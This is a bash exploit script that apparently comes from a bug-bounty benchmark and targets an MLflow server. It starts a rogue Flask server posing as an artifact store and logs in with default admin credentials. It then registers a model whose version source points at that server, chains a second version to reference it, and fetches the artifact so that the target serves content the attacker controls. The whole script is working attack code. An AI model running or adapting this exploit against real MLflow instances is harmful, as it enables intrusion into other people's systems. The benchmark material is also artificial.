#!/bin/bash

# Exit immediately if a command exits with a non-zero status.
set -e

BASE_URL="http://mlflow:5002"

# --- Dependency Installation ---
echo ">>> Checking/Installing Flask dependency..."
if python3 -m pip --version > /dev/null 2>&1; then
    python3 -m pip install Flask 
fi

# --- Configuration ---
PYTHON_SCRIPT_NAME="app.py"
FLASK_PORT=4444
# Use 0.0.0.0 to bind to all interfaces, but actual exploit uses container name
FLASK_HOST="0.0.0.0"

# --- Create Flask App File ---
echo ">>> Creating Flask application file (${PYTHON_SCRIPT_NAME})..."
cat > ${PYTHON_SCRIPT_NAME} <<EOF
from flask import Flask, jsonify
import sys

app = Flask(__name__)
# app.config["DEBUG"] = True
content = "pwned - mlflow"

@app.errorhandler(404)
def page_not_found(e):
    return content

@app.route("/api/2.0/mlflow-artifacts/artifacts")
def index():
    return jsonify({
        "files": [
            {
                "path": "/tmp/mlflow/bounty0",
                "is_dir": False,
                "file_size": len(content)
            }
        ]
    })

if __name__ == '__main__':
    # Use 'sys.argv' if you want to pass host/port from bash,
    # otherwise hardcode like below.
    app.run(host="$FLASK_HOST", port=$FLASK_PORT)
EOF
echo ">>> ${PYTHON_SCRIPT_NAME} created."

# --- Start Flask Server in Background ---
echo ">>> Starting Flask server in the background..."
# Start Python script, redirect stdout/stderr to files (optional but good for logs)
# Or use /dev/null to discard output: > /dev/null 2>&1
python3 ${PYTHON_SCRIPT_NAME} > flask_server.log 2>&1 &

# Capture the PID of the last background process
FLASK_PID=$!
echo ">>> Flask server started with PID: ${FLASK_PID}"

sleep 3

# Set MLflow authentication credentials
export MLFLOW_TRACKING_USERNAME=admin
export MLFLOW_TRACKING_PASSWORD=password

AUTH_HEADER="Authorization: Basic $(echo -n "admin:password" | base64)"
# Generate a random model name
MODEL_NAME="mlmodel_$(head -c 8 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 8)"
echo "[*] Using random model name: $MODEL_NAME"

echo "[*] Registering model..."
curl -X POST \
     -H 'Content-Type: application/json' \
     -H "$AUTH_HEADER" \
     -d "{\"name\": \"$MODEL_NAME\"}" \
     "$BASE_URL/ajax-api/2.0/mlflow/registered-models/create"
echo "[*] Model registration complete."

# Get the current IP address assigned to eth0
IP_ADDR=$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
MALICIOUS_SOURCE_URL="http://${IP_ADDR}:${FLASK_PORT}/api/2.0/mlflow-artifacts/artifacts/"
echo $MALICIOUS_SOURCE_URL
curl -X POST \
     -H 'Content-Type: application/json' \
     -H "$AUTH_HEADER" \
     -d "{\"name\": \"$MODEL_NAME\", \"source\": \"${MALICIOUS_SOURCE_URL}\"}" \
     "$BASE_URL/ajax-api/2.0/mlflow/model-versions/create"
echo "[*] Malicious model version creation complete."
echo "[*] Creating model version from reference..."
curl -X POST \
     -H 'Content-Type: application/json' \
     -H "$AUTH_HEADER" \
     -d "{\"name\": \"$MODEL_NAME\", \"source\": \"models:/$MODEL_NAME/1\"}" \
     "$BASE_URL/ajax-api/2.0/mlflow/model-versions/create"
echo "[*] Reference model version creation complete."

echo "[*] Fetching artifact..."
curl -H "$AUTH_HEADER" \
     "$BASE_URL/model-versions/get-artifact?path=random&name=$MODEL_NAME&version=2"
echo "[*] Artifact fetch complete."

# --- Cleanup generated Python script ---
echo ">>> Cleaning up: removing ${PYTHON_SCRIPT_NAME}..."
rm -f ${PYTHON_SCRIPT_NAME}